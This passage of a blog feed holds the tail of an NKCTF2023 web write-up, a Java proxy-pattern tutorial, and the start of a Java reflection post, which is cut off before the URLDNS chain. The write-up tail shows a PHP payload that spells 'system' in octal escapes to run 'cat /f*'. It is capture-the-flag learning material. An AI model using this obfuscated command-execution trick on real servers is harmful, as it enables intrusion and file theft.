class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="string">&quot;cat /f*&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/03/27/NKCTF2023-web/image-20230327131133172.png" class="" title="image-20230327131133172"><img src="/2023/03/27/NKCTF2023-web/image-20230327131542876.png" class="" title="image-20230327131542876">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;baby-php&quot;&gt;&lt;a href=&quot;#baby-php&quot; class=&quot;headerlink&quot; title=&quot;baby_php&quot;&gt;&lt;/a&gt;baby_php&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    <category term="CTFWP" scheme="http://example.com/categories/CTFWP/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>java代理模式</title>
    <link href="http://example.com/2023/03/23/java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/"/>
    <id>http://example.com/2023/03/23/java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</id>
    <published>2023-03-23T07:03:31.000Z</published>
    <updated>2023-03-23T10:36:10.084Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-代理模式"><a href="#1-代理模式" class="headerlink" title="1. 代理模式"></a>1. 代理模式</h2><p>代理模式是一种比较好理解的设计模式。简单来说就是 <strong>我们使用代理对象来代替对真实对象(real object)的访问，这样就可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</strong></p><p><strong>代理模式的主要作用是扩展目标对象的功能，比如说在目标对象的某个方法执行前后你可以增加一些自定义的操作。</strong></p><hr><p>举个列子;</p><p>自己是一个商人，在外地经商，由于人生地不熟，需要找个代理人给自己翻译，而代理人在为你工作的过程中 可以为做一些自己事情，但是每次都会完成你交给的任务，商人就是委托类，代理人就是代理类。</p><p>代理模式有静态代理和动态代理两种实现方式，我们 先来看一下静态代理模式的实现。</p><h2 id="2静态代理"><a href="#2静态代理" class="headerlink" title="2静态代理"></a>2静态代理</h2><p><strong>静态代理中，我们对目标对象的每个方法的增强都是手动完成的（*后面会具体演示代码*），非常不灵活（*比如接口一旦新增加方法，目标对象和代理对象都要进行修改*）且麻烦(*需要对每个目标类都单独写一个代理类*）。</strong> 实际应用场景非常非常少，日常开发几乎看不到使用静态代理的场景。</p><p>上面我们是从实现和应用角度来说的静态代理，从 JVM 层面来说， <strong>静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。</strong></p><hr><p><strong>1.定义发送短信的接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    String <span class="title function_">send</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.实现发送短信的接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.创建代理类并同样实现发送短信的接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsProxy</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SmsService smsService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SmsProxy</span><span class="params">(SmsService smsService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.smsService = smsService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="comment">//调用方法之前，我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method send()&quot;</span>);</span><br><span class="line">        smsService.send(message);</span><br><span class="line">        <span class="comment">//调用方法之后，我们同样可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method send()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>4.实际使用</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>();</span><br><span class="line">        <span class="type">SmsProxy</span> <span class="variable">smsProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsProxy</span>(smsService);</span><br><span class="line">        smsProxy.send(<span class="string">&quot;java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上述代码之后，控制台打印出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before method send()</span><br><span class="line">send message:java</span><br><span class="line">after method send()</span><br></pre></td></tr></table></figure><p>可以输出结果看出，我们已经增加了 <code>SmsServiceImpl</code> 的<code>send()</code>方法。</p><h2 id="3-动态代理"><a href="#3-动态代理" class="headerlink" title="3.动态代理"></a>3.动态代理</h2><hr><p><strong>从 JVM 角度来说，动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。</strong></p><p>说到动态代理，Spring AOP、RPC 框架应该是两个不得不提的，它们的实现都依赖了动态代理。</p><p>就 Java 来说，动态代理的实现方式有很多种，比如 <strong>JDK 动态代理</strong>、<strong>CGLIB 动态代理</strong>等等。</p><h3 id="3-1-JDK-动态代理机制"><a href="#3-1-JDK-动态代理机制" class="headerlink" title="3.1. JDK 动态代理机制"></a>3.1. JDK 动态代理机制</h3><h4 id="3-1-1-介绍"><a href="#3-1-1-介绍" class="headerlink" title="# 3.1.1. 介绍"></a><a href="#_3-1-1-%E4%BB%8B%E7%BB%8D">#</a> 3.1.1. 介绍</h4><p><strong>在 Java 动态代理机制中 <code>InvocationHandler</code> 接口和 <code>Proxy</code> 类是核心。</strong></p><p><code>Proxy</code> 类中使用频率最高的方法是：<code>newProxyInstance()</code> ，这个方法主要用来生成一个代理对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span><br><span class="line"><span class="params">                                      Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="params">                                      InvocationHandler h)</span></span><br><span class="line">    <span class="keyword">throws</span> IllegalArgumentException</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法一共有 3 个参数：</p><ol><li><strong>loader</strong> :类加载器，用于加载代理对象。</li><li><strong>interfaces</strong> : 被代理类实现的一些接口；</li><li><strong>h</strong> : 实现了 <code>InvocationHandler</code> 接口的对象；</li></ol><p>要实现动态代理的话，还必须需要实现<code>InvocationHandler</code> 来自定义处理逻辑。 当我们的动态代理对象调用一个方法时，这个方法的调用就会被转发到实现<code>InvocationHandler</code> 接口类的 <code>invoke</code> 方法来调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当你使用代理对象调用方法的时候实际会调用到这个方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>invoke()</code> 方法有下面三个参数：</p><ol><li><strong>proxy</strong> :动态生成的代理类</li><li><strong>method</strong> : 与代理类对象调用的方法相对应</li><li><strong>args</strong> : 当前 method 方法的参数</li></ol><p>也就是说：<strong>你通过<code>Proxy</code> 类的 <code>newProxyInstance()</code> 创建的代理对象在调用方法的时候，实际会调用到实现<code>InvocationHandler</code> 接口的类的 <code>invoke()</code>方法。</strong> 你可以在 <code>invoke()</code> 方法中自定义处理逻辑，比如在方法执行前后做什么事情。</p><h4 id="3-1-2-JDK-动态代理类使用步骤"><a href="#3-1-2-JDK-动态代理类使用步骤" class="headerlink" title="# 3.1.2. JDK 动态代理类使用步骤"></a><a href="#_3-1-2-jdk-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%AA%A4">#</a> 3.1.2. JDK 动态代理类使用步骤</h4><ol><li>定义一个接口及其实现类；</li><li>自定义 <code>InvocationHandler</code> 并重写<code>invoke</code>方法，在 <code>invoke</code> 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑；</li><li>通过 <code>Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</code> 方法创建代理对象；</li></ol><h4 id="3-1-3-代码示例"><a href="#3-1-3-代码示例" class="headerlink" title="# 3.1.3. 代码示例"></a><a href="#_3-1-3-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B">#</a> 3.1.3. 代码示例</h4><p>这样说可能会有点空洞和难以理解，我上个例子，大家感受一下吧！</p><p><strong>1.定义发送短信的接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    String <span class="title function_">send</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.实现发送短信的接口</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.定义一个 JDK 动态代理类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> shuang.kou</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@createTime</span> 2020年05月11日 11:23:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DebugInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代理类中的真实对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DebugInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//调用方法之前，我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        <span class="comment">//调用方法之后，我们同样可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>invoke()</code> 方法: 当我们的动态代理对象调用原生方法的时候，最终实际上调用到的是 <code>invoke()</code> 方法，然后 <code>invoke()</code> 方法代替我们去调用了被代理对象的原生方法。</p><p><strong>4.获取代理对象的工厂类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdkProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(), <span class="comment">// 目标类的类加载</span></span><br><span class="line">                target.getClass().getInterfaces(),  <span class="comment">// 代理需要实现的接口，可指定多个</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">DebugInvocationHandler</span>(target)   <span class="comment">// 代理对象对应的自定义 InvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getProxy()</code> ：主要通过<code>Proxy.newProxyInstance（）</code>方法获取某个类的代理对象</p><p><strong>5.实际使用</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> (SmsService) JdkProxyFactory.getProxy(<span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>());</span><br><span class="line">smsService.send(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure><p>运行上述代码之后，控制台打印出：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before method send</span><br><span class="line">send message:java</span><br><span class="line">after method send</span><br></pre></td></tr></table></figure><hr><p>原文链接：<a href="https://javaguide.cn/java/basis/proxy.html">https://javaguide.cn/java/basis/proxy.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-代理模式&quot;&gt;&lt;a href=&quot;#1-代理模式&quot; class=&quot;headerlink&quot; title=&quot;1. 代理模式&quot;&gt;&lt;/a&gt;1. 代理模式&lt;/h2&gt;&lt;p&gt;代理模式是一种比较好理解的设计模式。简单来说就是 &lt;strong&gt;我们使用代理对象来代替对真实对象(re</summary>
      
    
    
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java反射与URLDNS链</title>
    <link href="http://example.com/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/"/>
    <id>http://example.com/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/</id>
    <published>2023-03-22T11:47:28.000Z</published>
    <updated>2023-04-09T10:31:38.592Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、什么是反射："><a href="#一、什么是反射：" class="headerlink" title="一、什么是反射："></a>一、什么是反射：</h1><p>（1）Java反射机制的核心是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法。本质是JVM得到class对象之后，再通过class对象进行反编译，从而获取对象的各种信息。</p><p>（2）Java属于先编译再运行的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，不需要提前在编译期知道运行的对象是谁。</p><h1 id="二、反射的原理："><a href="#二、反射的原理：" class="headerlink" title="二、反射的原理："></a>二、反射的原理：</h1><p>下图是类的正常加载过程、反射原理与class对象：</p><p>Class对象的由来是将.class文件读入内存，并为之创建一个Class对象。</p><img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2E3NDUyMzM3MDA=,size_16,color_FFFFFF,t_70.png" class="" title="img"><p>对于类加载机制与双亲委派模型感兴趣的小伙伴可以阅读这篇文章：<a href="https://blog.csdn.net/a745233700/article/details/90232862">https://blog.csdn.net/a745233700/article/details/90232862</a></p><img src="/2023/03/22/java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NzMzNzUx,size_16,color_FFFFFF,t_70.png" class="" title="img"><p>这三个阶段我们最熟悉的是Runtime运行阶段，对于源码（编译）阶段和Class类对象阶段可能不是很熟悉。</p><p>源码（编译）阶段：这个阶段通常是把一个类的.java文件编译成.class字节码文件的过程（默认一个类对应一个.java源文件）。</p><p>Class类对象阶段：这个阶段是将一个类的.class字节码文件加载到内存并创建一个与之对应的Class对象（这个过程也称为反射），jvm的类加载器ClassLoader把.class字节码文件加载进内存后，会把.class字节码文件中的成员属性，构造，成员方法抽取出来封装成一个Class对象，成员属性封装成Field[]数组来表示，构造函数封装成Construction[]来表示，成员方法封装成Method[]数组来表示，但实际上Class类内部封装了很多东西，这里我们只关注这三个。</p><p>RunTime运行时阶段：在程序运行阶段，例如使用常规操作new创建Student类的实例对象时，jvm会使用类加载器把.class文件加载到内存中并为之生成一个Class对象，然后这个Class对象与stu1对象有一个映射关系，也就是说，在RunTime运行时阶段只要访问了Person类的内容就会触发Class类对象阶段。</p><p>解释一下Class类对象阶段中的Class对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当jvm加载类时会在堆内存中产生一个Class类型的对象（一个类只有一个Class对象，并且Class对象的类型为Class，注意：是Class类，不是class关键字），这个对象包含了类内部的完整结构信息（成员属性，构造，成员方法），通过这个Class对象可以得到类内部结构信息，换句话说，类对象就像是一面镜子一样，透过这个镜子看到类的结构，因此称为反射。</span><br></pre></td></tr></table></figure><h1 id="三、反射的优缺点："><a href="#三、反射的优缺点：" class="headerlink" title="三、反射的优缺点："></a>三、反射的优缺点：</h1><p>1、优点：在运行时获得类的各种内容，进行反编译，对于Java这种先编译再运行的语言，能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。</p><p>2、缺点：（1）反射会消耗一定的系统资源，因此，如果不需要动态地创建一个对象，那么就不需要用反射；</p><p>（2）反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。</p><h1 id="四、反射的用途："><a href="#四、反射的用途：" class="headerlink" title="四、反射的用途："></a>四、反射的用途：</h1><p>1、反编译：.class–&gt;.java</p><p>2、通过反射机制访问java对象的属性，方法，构造方法等</p><p>3、当我们在使用IDE,比如Ecplise时，当我们输入一个对象或者类，并想调用他的属性和方法是，一按点号，编译器就会自动列出他的属性或者方法，这里就是用到反射。</p><p>4、反射最重要的用途就是开发各种通用框架。比如很多框架（Spring）都是配置化的（比如通过XML文件配置Bean），为了保证框架的通用性，他们可能需要根据配置文件加载不同的类或者对象，调用不同的方法，这个时候就必须使用到反射了，运行时动态加载需要的加载的对象。</p><p>5、例如，在使用Strut2框架的开发过程中，我们一般会在struts.xml里去配置Action，比如</p><action name="login" class="org.ScZyhSoft.test.action.SimpleLoginAction" method="execute">       <result>/shop/shop-index.jsp</result>               <result name="error">login.jsp</result>       </action>比如我们请求login.action时，那么StrutsPrepareAndExecuteFilter就会去解析struts.xml文件，从action中查找出name为login的Action，并根据class属性创建SimpleLoginAction实例，并用Invoke方法来调用execute方法，这个过程离不开反射。配置文件与Action建立了一种映射关系，当View层发出请求时，请求会被StrutsPrepareAndExecuteFilter拦截，然后StrutsPrepareAndExecuteFilter会去动态地创建Action实例。<p>比如，加载数据库驱动的，用到的也是反射。</p><p>Class.forName(“com.mysql.jdbc.Driver”); &#x2F;&#x2F; 动态加载mysql驱动</p><h1 id="五、反射机制常用的类："><a href="#五、反射机制常用的类：" class="headerlink" title="五、反射机制常用的类："></a>五、反射机制常用的类：</h1><p>Java.lang.Class;</p><p>Java.lang.reflect.Constructor;</p><p>Java.lang.reflect.Field;</p><p>Java.lang.reflect.Method;</p><p>Java.lang.reflect.Modifier;</p><h1 id="六、反射的基本使用："><a href="#六、反射的基本使用：" class="headerlink" title="六、反射的基本使用："></a>六、反射的基本使用：</h1><blockquote><p>1、获得Class：主要有三种方法：</p><p>（1）Object–&gt;getClass</p><p>（2）任何数据类型（包括基本的数据类型）都有一个“静态”的class属性</p><p>（3）通过class类的静态方法：forName(String className)（最常用）</p></blockquote><h2 id="Java-lang-reflect-Constructor"><a href="#Java-lang-reflect-Constructor" class="headerlink" title="Java.lang.reflect.Constructor;"></a>Java.lang.reflect.Constructor;</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getConstructor(<span class="string">&quot;构造方法的类别&quot;</span>....)</span><br><span class="line">newInstance(<span class="string">&quot;可以加上自己构造的class&quot;</span>....)</span><br><span class="line"><span class="comment">//获取String的Class对象</span></span><br><span class="line">Class&lt;?&gt; str = String.class;</span><br><span class="line"><span class="comment">//通过Class对象获取指定的Constructor构造器对象</span></span><br><span class="line">Constructor constructor=c.getConstructor(String.class);</span><br><span class="line"><span class="comment">//根据构造器创建实例：</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(“hello reflection”);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor().newInstance(); <span class="comment">//User obj =new User();</span></span><br></pre></td></tr></table></figure><h2 id="Java-lang-reflect-Field"><a href="#Java-lang-reflect-Field" class="headerlink" title="Java.lang.reflect.Field"></a>Java.lang.reflect.Field</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.User&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">fb</span> <span class="operator">=</span> cls.getField(<span class="string">&quot;参数名&quot;</span>) 获取公有字段并调用</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span>cls.getDeclaredField(<span class="string">&quot;参数名&quot;</span>)获取私有字段</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射，解除私有限定</span></span><br><span class="line">f.set(obj,<span class="string">&quot;参数值&quot;</span>)；</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filed</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.User&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;************获取所有公有的字段********************&quot;</span>);</span><br><span class="line">        Field[] fieldArray = cls.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f : fieldArray)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fb</span> <span class="operator">=</span> cls.getField(<span class="string">&quot;age&quot;</span>); <span class="comment">//获取公有字段**并调用</span></span><br><span class="line">        <span class="comment">//获取一个对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> cls.getConstructor().newInstance(); <span class="comment">//User obj =new User();</span></span><br><span class="line">        User U=(User)obj;</span><br><span class="line">        fb.set(obj,<span class="number">100</span>);</span><br><span class="line">        System.out.println(U.age);<span class="comment">//public</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span>cls.getDeclaredField(<span class="string">&quot;name&quot;</span>);  <span class="comment">//获取私有字段**并调用</span></span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射，解除私有限定</span></span><br><span class="line">        <span class="comment">//为字段设置值</span></span><br><span class="line">        f.set(obj,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        System.out.println(U.getName());</span><br><span class="line"></span><br><span class="line">        f = 